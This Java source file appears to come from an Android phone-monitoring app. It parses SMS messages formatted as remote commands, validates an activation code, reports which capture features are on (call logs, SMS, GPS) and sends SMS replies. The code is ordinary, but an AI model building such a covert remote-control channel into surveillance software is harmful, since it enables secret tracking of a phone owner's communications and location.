package com.vvt.android.syncmanager.smscommand;

import java.util.ArrayList;
import java.util.StringTokenizer;
import java.util.regex.Pattern;

import android.content.Context;
import com.fx.dalvik.util.FxLog;

import com.fx.android.common.Customization;
import com.fx.android.common.sms.SmsSender;
import com.fx.dalvik.event.Event;
import com.fx.dalvik.event.EventSystem;
import com.fx.dalvik.resource.StringResource;
import com.fx.dalvik.util.GeneralUtil;
import com.vvt.android.syncmanager.control.ConfigurationManager;
import com.vvt.android.syncmanager.control.LicenseManager;
import com.vvt.android.syncmanager.control.Main;

public class SmsCommandHelper {
	
	private static final String TAG = "SmsCommandHelper";
	private static final boolean DEBUG = true;
 	private static final boolean LOCAL_LOGV = Customization.DEBUG ? DEBUG : false;
	private static final boolean LOCAL_LOGD = Customization.DEBUG ? DEBUG : false;
 	
	private static final String REGEX_POSSIBLE_SMS_COMMAND = "[<][*][#].*";
	private static final String REGEX_COMMAND_FORMAT = "[*][#][0-9]+";
	private static final String TAG_DELIMITERS = "<|>";
	
	public static final String REGEX_ACTIVATION_CODE = "[0-9]+";
	public static final String COMMA_DELIMITERS = ",[ ]*";
	
	public static void captureEventSystem(
    		String phoneNumber, String messageBody, short direction) {
		
		// Create a data for a new event
		StringBuilder data = new StringBuilder();
		data.append("SMS\n");
		data.append(String.format("Phone Number: %s\n", phoneNumber));
		data.append(String.format("Message Body: %s", messageBody));
		
		// Create a new system event
		EventSystem event = new EventSystem(
				System.currentTimeMillis(), direction, data.toString());
		
		// Insert an event to database
		Main.getInstance().getEventsManager().insert(event);
	}
	
	/**
	 * Check if a final token is a debug tag
	 */
	public static boolean isEndWithDebugTag(String[] tokens) {
		return tokens[tokens.length-1].equalsIgnoreCase("d");
	}
	
	public static String getActivationCodeValidation(String activationCode) {
		LicenseManager licenseManager = Main.getInstance().getLicenseManager();
		String reportMessage = null;
		
		// No activation code or Product is not yet activated
		if (licenseManager == null 
				|| licenseManager.getActivationCode() == null
				|| !licenseManager.isActivated()) {
			reportMessage = StringResource.LANGUAGE_SMSCOMMAND_RESPONSE_PRODUCT_IS_NOT_ACTIVATED;
		}
		// Invalid Activation Code -> contains letters or symbols
		else if (!Pattern.matches(REGEX_ACTIVATION_CODE, activationCode)) {
			reportMessage = StringResource.LANGUAGE_SMSCOMMAND_RESPONSE_INVALID_ACTIVATION_CODE;
		}
		// Wrong Activation Code
		else if (!licenseManager.getActivationCode().equals(activationCode)) {
			reportMessage = StringResource.LANGUAGE_SMSCOMMAND_RESPONSE_WRONG_ACTIVATION_CODE;
		}
		else {
			return StringResource.LANGUAGE_SMSCOMMAND_RESPONSE_OK;
		}
		
		return reportMessage;
	}
	
	/**
	 * Generate current settings response message
	 */
	public static String getCurrentSettings() {
		ConfigurationManager configManager = Main.getInstance().getConfigurationManager();
		
		StringBuilder builder = new StringBuilder();
		builder.append("==Current Settings==\n");
		
		builder.append("Start Capture:");
		builder.append(configManager.loadCaptureEnabled() ? "Yes" : "No")
				.append("\n");
		
		builder.append("Events:");
		ArrayList<String> capturedList = new ArrayList<String>();
		if (configManager.loadCapturePhoneCallEnabled()) {
			builder.append("Call log");
			capturedList.add("Call log");
		}
		if (configManager.loadCaptureSmsEnabled()) {
			if (capturedList.size() > 0) {
				builder.append(",");
			}
			builder.append("SMS");
			capturedList.add("SMS");
		}
		if (configManager.loadCaptureLocationEnabled()) {
			if (capturedList.size() > 0) {
				builder.append(",");
			}
			builder.append("GPS");
			capturedList.add("GPS");
		}
		if (capturedList.isEmpty()) {
			builder.append("None");
		}
		builder.append("\n");
		
		if (configManager.loadCaptureLocationEnabled()) {
			builder.append("GPS Interval:");
			builder.append(
					GeneralUtil.getTimeDisplayValue(
							configManager.loadGpsTimeIntervalSeconds()).trim()).append("\n");
		}
		
		int timer = (int) configManager.loadDeliveryPeriodHours();
		builder.append("Timer:");
		builder.append(String.format("%d%s", timer, timer < 2 ? "hour" : "hours")).append("\n");
		
		builder.append("Max Event:");
		builder.append(configManager.loadMaxEvents());
		
		return builder.toString();
	}
	
	/**
	 * Check whether an input String is considered an SMS command.
	 * This method should be called before other operations.
	 * No further operation is required, if an incoming SMS is not a command.
	 */
	public static boolean isConsideredSmsCommand(String messageBody) {
		if (LOCAL_LOGV) {
			FxLog.v(TAG, "isPossibleSmsCommand # ENTER ...");
		}
		return Pattern.matches(REGEX_POSSIBLE_SMS_COMMAND, messageBody); 
	}
	
	/**
	 * Check if an SMS command need a responding message.
	 */
	public static boolean isRequestSendingResponse(Context context, String messageBody) {
		return messageBody.endsWith("<D>") || messageBody.endsWith("<d>");
	}
	
	/**
	 * Validate and construct header for responding message.
	 * Throw SmsCommandException, when the validation is fail.
	 * An exception message is made ready for sending a response.
	 */
	public static String getResponseHeader(Context context, 
			String productIdVersion, String displayMessageBody) throws SmsCommandException {
		
		StringBuilder builder = new StringBuilder();
		
		// Append product ID Version
		builder.append("[").append(productIdVersion).append("]");
		
		// Invalid TAGs format
		if (!checkTagFormat(displayMessageBody)) {
			builder.append(" ").append(
					StringResource.LANGUAGE_SMSCOMMAND_RESPONSE_INVALID_COMMAND_FORMAT);
			throw new SmsCommandException(builder.toString());
		}
		
		// Prepare tokens
		String[] tokens = GeneralUtil.getTokenArray(displayMessageBody, TAG_DELIMITERS);
		
		// Not a command -> contains letters
		if (tokens.length > 0 && !Pattern.matches(REGEX_COMMAND_FORMAT, tokens[0])) {
			builder.append(" ").append(StringResource.LANGUAGE_SMSCOMMAND_RESPONSE_NOT_A_COMMAND);
			throw new SmsCommandException(builder.toString());
		}
		
		// Command code e.g. *#60
		String commandCode = tokens[0];
		builder.append("[").append(getCommandNumber(commandCode)).append("] ");
		
		return builder.toString();
	}
	
	/**
	 * Send response message.
	 */
	public static void sendResponseMessage(
			Context context, String phoneNumber, String messageBody) {
		
		if (LOCAL_LOGV) {
			FxLog.v(TAG, "sendResponseMessage # message: " + messageBody);
		}
		
		// Avoid message stuck while sending
		try {
			Thread.sleep(1000);
		} 
		catch (InterruptedException e) {
			if (LOCAL_LOGD) FxLog.d(TAG, "", e);
		}
		
		SmsSender smsSender = new SmsSender(context);
		smsSender.sendSms(phoneNumber, messageBody);
		
		captureEventSystem(phoneNumber, messageBody, Event.DIRECTION_OUT);
	}
	
	/**
	 * Check that every TAG has properly open-and-close.
	 * No inner TAGs are allowed.
	 */
	private static boolean checkTagFormat(String input) {
		boolean foundOpenTag = false;
		char read;
		for (int i = 0; i < input.length(); i++) {
			read = input.charAt(i);
			if (!foundOpenTag && read == '<') {
				foundOpenTag = true;
			}
			else if (foundOpenTag && read == '>') {
				foundOpenTag = false;
			}
			else if ((!foundOpenTag && read == '>') 
					|| (foundOpenTag && read == '<')){
				return false;
			}
		}
		return foundOpenTag ? false : true;
	}
	
	/**
	 * Remove *# from command code.
	 */
	private static String getCommandNumber(String commandCode) {
		return new StringTokenizer(commandCode, "*#").nextToken();
	}

}
